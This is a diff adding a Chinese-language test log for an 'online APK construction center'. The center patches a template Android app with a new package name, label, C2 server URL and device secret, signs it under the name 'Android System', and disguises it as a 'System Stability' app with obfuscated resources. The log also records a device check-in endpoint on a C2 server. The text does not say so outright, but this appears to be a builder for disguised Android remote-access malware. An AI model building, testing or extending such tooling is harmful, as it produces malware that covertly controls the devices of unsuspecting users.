@@ -232,3 +232,66 @@ GET  /healthz      → 200 ok ✓
 - 注意：验证中 rename 别名经控制台 ASCII 写入显示为 "??"，为测试机控制台
   编码问题，非服务端缺陷（HTTP 往返 JSON 与落盘流程正常）。
 
+---
+
+## 10. 在线 APK 构造中心验证（2026-11-12 14:2x，PORT=10003）
+
+> 实现与口径见 PATCH_NOTES.md §10。以下全部为实测记录。
+> 环境：本机 JDK21（C:\Program Files\Microsoft\jdk-21.0.13.21-hotspot）、
+> SDK build-tools 36 的 apksigner.jar/zipalign.exe/aapt2 用于校验（仅测试用，
+> 未写入仓库；仓库内 builder/ 的 apksigner.jar/zipalign 为 build-env 产物与
+> linux 版 zipalign）。
+
+### 10.1 合成模板（aapt2 自建，先于真实模板落地时验证代码路径）
+
+```
+POST /api/build multipart+图标(pkg=com.newpkg.testapp) → 200, application/vnd.android.package-archive ✓
+apksigner verify --print-certs → Signer CN=LabRATS Builder ✓
+aapt2 dump badging → package: name='com.newpkg.testapp' ✓  label='My Stability    ' ✓
+classes.dex 反查：新 pkg/C2/secret 存在、旧占位全部消失 ✓；图标条目 isPNG ✓
+JSON 模式 + iconBase64 → 200 ✓
+错误路径：包名长度(17/应为18) → 400 "包名长度必须等于 18" ✓；非法 secret → 400 ✓；
+非 https C2 → 400 ✓；伪 PNG → 400 "PNG 魔数校验失败" ✓
+空 builder 目录 → 503 "构造模块未就绪" + 页面徽标"未就绪" ✓
+```
+
+### 10.2 真实模板（build-env 产物，22.7MB / 983 条目）
+
+占位实测（解压后扫描）：
+```
+pkg com.stability.sync: len=18, ascii=1, utf16=5   （README 写 17 为误数）
+name System Stability:  len=16, ascii=5, utf16=2
+c2 (URL+64'#'):         len=96, ascii=1            （65'#' 变体 0 命中）
+secret 32hex:           ascii=1
+resources.arsc method=0（STORED）；classes.dex/4×.so method=8；无 mipmap/ic_launcher 条目（路径混淆）
+```
+
+无图标构造：
+```
+POST /api/build → 200, 22,896,283 bytes, 耗时 1.6s
+日志: [BUILD OK] pkg=com.newpkg.testapp name="My Stability" icon=no (替换 pkg=6 name=7 c2=1 secret=1)
+apksigner verify → exit 0（Signer CN=Android System, O=Local Build —— builder-keystore.p12 的 DN）
+zipalign -c 4（Windows SDK zipalign）→ exit 0（内存重建对齐生效，Linux 上另有真 zipalign）
+aapt2 dump badging → package: name='com.newpkg.testapp' versionCode='623' ✓
+                       application-label:'My Stability    '（16 字符右补空格）✓
+```
+
+图标路径：
+```
+上传图标（无 BUILDER_ICON_ENTRY）→ 明确中文错误（资源路径混淆，提示设置变量或不上传）✓
+BUILDER_ICON_ENTRY=res/13.webp + 图标 → 200 icon=yes；
+  apksigner verify exit=0 ✓；zipalign -c exit=0 ✓；badging package ✓；
+  res/13.webp 条目反查 isPNG=true size=70 ✓
+```
+
+设备端点冒烟（DEVICE_SECRET=32hex）：
+```
+check-in 带 secret → 200；无 secret → 401 ✓
+```
+
+### 10.3 验证后清理
+- 已停止全部 node 测试进程；删除 c2-server/devices.json、uploads/ 与
+  builder/ 内测试期产生的 tmp_*.idsig；builder/ 现仅存 build-env 产物 +
+  zipalign（linux ELF 267KB）。
+- 合成测试物均在 %TEMP%\apkbuilder-test（未进仓库）。
+
